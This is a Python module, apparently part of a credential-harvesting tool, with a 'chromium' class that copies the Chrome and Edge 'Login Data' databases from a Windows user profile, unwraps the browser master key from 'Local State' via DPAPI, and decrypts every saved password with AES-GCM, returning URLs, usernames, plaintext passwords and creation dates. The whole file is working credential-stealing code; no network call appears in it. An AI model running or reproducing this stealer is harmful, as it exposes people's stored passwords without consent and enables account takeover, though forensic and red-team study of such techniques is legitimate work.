import os 
import sqlite3
import json
import base64
import win32crypt
import binascii
import glob
import shutil
from Crypto.Cipher import AES
from datetime import datetime,timedelta


class chromium:
    USERPROFILE=os.environ['USERPROFILE']
    chrome_profile_path="/AppData/Local/Google/Chrome/User Data/"
    edge_profile_path="/AppData/Local/Microsoft/Edge/User Data/"
    login_data_file='Login Data'
    local_state_file='Local State'

    query_chromium_login_sql= "SELECT origin_url, username_value, password_value, date_created FROM logins"

    # 将 chrome 日期格式转换为人类可读的日期时间格式
    # 'chromedate'的格式是1601年1月以来的微秒数
    def get_chrome_datetime(self, chromedate):
        if chromedate != 86400000000 and chromedate:
            try:
                return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
            except Exception as e:
                print(f"Error: {e}, chromedate: {chromedate}")
                return chromedate
        else:
            return ""

    def get_encryption_key(self, chrome_local_state_path):
        file_list=glob.glob(chrome_local_state_path)
        if file_list:
            with open(file_list[0],"r",encoding="utf-8") as file:
                local_state=file.read()
                local_state=json.loads(local_state)
            key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            key = key[5:]
            return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
        return None

    def decrypt_password(self, password, key):
        try:
            iv = password[3:15]
            password_ciphertext = password[15:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            return cipher.decrypt(password_ciphertext)[:-16].decode()
        except:
            try:
                return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1],encoding='utf-8')
            except:
                # not supported
                return ""

    def get_login_data(self, login_data_path):
        file_list=glob.glob(login_data_path)
        if file_list:
            filename=self.login_data_file
            shutil.copyfile(file_list[0],filename)

            conn=sqlite3.connect(filename)
            cursor = conn.cursor()
            cursor.execute(self.query_chromium_login_sql)
            login_data=cursor.fetchall()
            cursor.close()
            conn.close()
            try:
                os.remove(filename)
            except:
                pass
            return login_data
        return False

    def print_login_data(self, login_data, key, browser):
        print(browser)
        for item in login_data:
            url=item[0]
            username=item[1]
            password=self.decrypt_password(item[2],key)
            date_created=self.get_chrome_datetime(item[3])

            if username or password:
                print(f"url: {url}")
                print(f"username: {username}")
                print(f"password: {password}")
                print(f"creation date: {date_created}")
    
    def return_result(self, browser, login_data, key):
        #desc=browser+" credentials data"
        desc=browser+" Passwords Data"
        result={}
        result['desc']=desc
        data=[]
        for item in login_data:
            url=item[0]
            username=item[1]
            password=self.decrypt_password(item[2],key)
            date_created=self.get_chrome_datetime(item[3])

            if username or password:
                data_item={}
                data_item['url']=url
                data_item['username']=username
                data_item['password']=password
                data_item['creation_date']=str(date_created)
                data.append(data_item)
        result['data']=data
        return result


    def run(self, target_list):
        result=[]
        if 'chrome' in target_list:
            # chrome browser
            chrome_login_data_path=self.USERPROFILE+self.chrome_profile_path+"*/"+self.login_data_file
            chrome_local_state_path=self.USERPROFILE+self.chrome_profile_path+self.local_state_file
            chrome_login_data=self.get_login_data(chrome_login_data_path)
            if chrome_login_data:
                chrome_key=self.get_encryption_key(chrome_local_state_path)
                chrome_result=self.return_result('Chrome',chrome_login_data, chrome_key)
                result.append(chrome_result)
        
        if 'edge' in target_list:
            # edge browser
            edge_login_data_path=self.USERPROFILE+self.edge_profile_path+"*/"+self.login_data_file
            edge_local_state_path=self.USERPROFILE+self.edge_profile_path+self.local_state_file
            edge_login_data=self.get_login_data(edge_login_data_path)
            if edge_login_data:
                edge_key=self.get_encryption_key(edge_local_state_path)
                edge_result=self.return_result('Edge',edge_login_data, edge_key)
                result.append(edge_result)
        return result

